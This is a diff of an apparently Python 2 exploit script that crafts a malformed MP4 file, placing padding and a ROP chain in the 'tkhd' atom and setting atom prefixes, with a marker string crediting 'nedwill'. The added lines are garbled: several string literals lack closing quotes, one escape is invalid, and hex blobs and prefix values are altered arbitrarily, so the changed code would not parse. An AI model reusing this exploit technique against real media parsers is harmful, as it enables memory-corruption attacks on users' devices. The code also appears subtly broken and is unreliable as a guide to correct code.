@@ -60,7 +60,7 @@ r2 = where - 12
 
 UNICODE_MARKER = '\xff\xfe' # unicode marker
 
-exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
+exp = "<\x008\x005\x00n\x00e\x00d\x00w\x00d\x00l\x00l\x00 \x002\x000\x001\x009\x00"
 exp += " \x00"*((772-len(exp)) / 2)
 assert len(exp) == 772
 
@@ -158,8 +158,8 @@ tkhd_data = 'A'*136 # padding
 if REGION != 'kor':
     tkhd_data += 'A'*0x28 # padding
 tkhd_data += rop # ROP starts here
-tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
-tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")
+tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000000000000000000001000000000000000000.decode("hex")
+tkhd_data += '00000000000000000100000000000000000000000000004000000000000000000000001000000000000000000001000000000000001000'.decode("hex")
 
 assert len(tkhd_data) < 0x800 # so we don't allocate off the tail.
 
@@ -213,10 +213,10 @@ l = [('ftyp', '4d344120000000004d3441206d70343269736f6d00000000'),
     ]
 
 prefixes = {
-    'meta': '\x00\x00\x00\x00',
-    'stsd': '\x00\x00\x00\x00\x00\x00\x00\x01',
-    'dref': '\x00\x00\x00\x00\x00\x00\x00\x01',
-    'mp4a': '\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
+    'meta': '\x00\x00\x00\x08
+    'stsd': '\x00\x00\x00\x00\x00\x00\x00\x09,
+    'dref': '\x00\x00\x00\x00\x00\x00\x00\x01,
+    'mp4a': '\x00\x00\x00\x00\x00\x00\x00\x01\x5\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
 }
 
 def to_string(tree):
